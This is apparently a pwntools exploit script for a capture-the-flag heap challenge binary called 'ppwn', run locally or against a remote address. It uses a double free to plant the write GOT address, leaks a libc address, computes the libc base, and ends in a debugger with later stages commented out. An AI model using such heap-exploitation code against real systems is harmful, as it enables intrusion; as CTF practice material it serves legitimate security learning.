#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

local = 1
if local:
    p = process('./ppwn')
    elf = ELF('./ppwn')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote('124.16.75.162', 31050)
    elf = ELF('./ppwn')
    libc = ELF('./libc6_2.27-3ubuntu1.4_amd64.so')

def choice(c):
    p.recvuntil('\n-------')
    p.sendline(str(c))

def leave():
    choice(1)

def delete(slp=False):
    choice(2)
    if slp:
        sleep(2)

def show():
    choice(3)

def create(sz, data):
    choice(4)
    p.recvuntil('size:\n')
    p.sendline(str(sz))
    p.recvuntil('content:\n')
    p.send(data)

write_got = elf.got['write']
write_plt = elf.plt['write']

# double free
create(0x18, 'A')
create(0x18, 'B')
delete()
delete()

# leak libc
create(0x18, p64(write_got))
create(0x18, 'A')
create(0x18, 'B')
create(0x18, p64(write_plt + 6))
show()
p.recvuntil('Item3:\n')
p.recv(0x10)
printf = u64(p.recv(6).ljust(8, '\x00'))
info('printf = ' + hex(printf))
libc_base = printf - libc.symbols['printf']
info('libc_base = ' + hex(libc_base))
#delete(slp=True)

# double free
#create(0x68, 'A')

gdb.attach(p)

p.interactive()
